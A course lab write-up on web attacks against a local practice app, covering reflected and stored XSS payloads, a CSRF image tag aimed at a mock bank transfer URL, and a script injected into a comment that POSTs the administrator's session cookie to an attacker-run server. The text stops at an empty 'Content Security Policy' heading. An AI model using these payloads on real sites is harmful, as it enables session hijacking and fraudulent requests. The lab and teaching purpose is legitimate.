# XSS and CORS

## Environment setup

After setting the app, installing the requirments, etc. We open the browser one in normal mode and
the other in incognito mode. The Admin will be in the normal and the attacker in the incognito.
We will know proceed into making a couple of attacks to the website.

Access the site in the URL **http://aula3:6543**

## Cross-Site Scripting

### Reflected XSS Attack

In this type of attack it is assumed that the attack is non-persistent. With this attack it becomes
possible to manipulate the browser Document Object Model (DOM) for a single user, or multiple which
access a page through the same specially crafted **URL** depicts a typical scenario.

#### How to do it in our Website:

Using the Blog Search bar, which searches directly using the website, we can pass:
```
<script>alert("You are under attack")</script>
```
Because we are passing a script tag, the site will interpert it as being part of the code and will
execute it (alert is not the best for attackers but shows well what happens).

URL generated: `http://aula3:6543/search?q=%3Cscript%3Ealert%28%22You+are+under+attack%22%29%3C%2Fscript%3E`

### Stored XSS Attack

It allows an attacker to place malicious script (Javascript) into a webpage. Victms that
access the website will render all the scripts, including the injected one.
Common in a place where the information is shared between users through web technologies
(e.g. forums and blogs).This way the attacker composes a message, hides some script in its source
code, and puts it in place, which is accessed by a victim. All users visiting that place would
execute the exploit.
There are 2 types of **Stored XSS Attack**, **Server Side** and **Client Side**.

#### Server Side

The payload must be included in the web page when the page is built by the server.

#### Client Side

Loads dynamic content into the web page using JS. `<script>` tags are not evaluated directly,
but JS can be included in objects event handlers (e.g. onload, onclick).

#### How to do it in our Website:

* Server Side:
As we can see in our website there is a place where people can comment on a blog. This comment
is stored in the code and loads when the page loads.
The name tag does not let us execute a XSS atack but the comment does.
We put whtever name we want and make a comment like:
```
<script>alert("Loading Virus...")</script>
```
Every user that loads the page will receive this alert.

* Client Side:

Using the same principle as the last one, but using a `<button>` yag this time, we can execute
a Client Side attack.
On the comment put:
```
<button type="button" onclick="alert('You should not have clicked!')">Click Me!</button>
```
Once again any user that cicks the button will suffer the exploit.

### CSRF Attack

The Cross-Site Request Forgery, CSRF, attack consists in injecting code that, using the
credentials and capabilities of the browser viewing a given object, may attack another
system. This attack can be used for simple Denial of Service (DoS) or Distributed Denial
of Service (DDoS), tracking users, or invoke requests on systems with the identity of
the victim.

This exploits the fact that, for usability, functionality, and performance purposes,
systems cache authentication credentials in small tokens named **cookies**.
When a user accesses a service, such as a social sharing application,
or a Online Banking solution, a session is initialized, and will be kept valid for a long
period. Even if the user abandons the webpage. However, if the user visits another page
which has a CSRF exploit, targeting the first page, it is possible to invoke services
using the user identity, without his knowledge. This attack is frequently don using the
`<img>` tag, however other tags can be used.

As an example, consider that a forum post contains the following content:
```
Totally legit message :)
<img src='https://vulnerable-bank.com/transfer.jsp?amount=1000&to_nib=12345300033233'></img>
```
When the browser tries to load the image, it will invoke an action to an external server.
In this hypothetical case, it would transfer funds from the victims bank account to the
attacker's bank account.

Sometimes a more complex interaction is required, and the attack will actually inject JS code:
```
$.ajax({
url: 'http://external:8000/cookie',
type: 'POST',
data: "username=Administrator&cookie=" + document.cookie,
});
```

#### Exercise:
-	1) Navigate to the directory where we dumped our downloaded package
-	2) Run the script **hacker_server.py**
-	3) Do a POST to **http://localhost:8000**

This script will dump to **stdout** all data that is posted to it (using HyperText
Transfer Protocol (HTTP) POST).

Following the last exercise, we already know that we can inject  `<script>` tags
into a post's page by creating a comment and putting some code into the
Description field. So, by including the following code into the comment:
```
<script>
	$.ajax({
	        url: 'http://localhost:8000/cookie',
		type: 'POST',
		data: "username=Administrator;cookie=a"+document.cookie,
	})
</script>
```

As we can see in the running **hacker_server** we have received the Administrator
Session Cookie.

## Content Security Policy
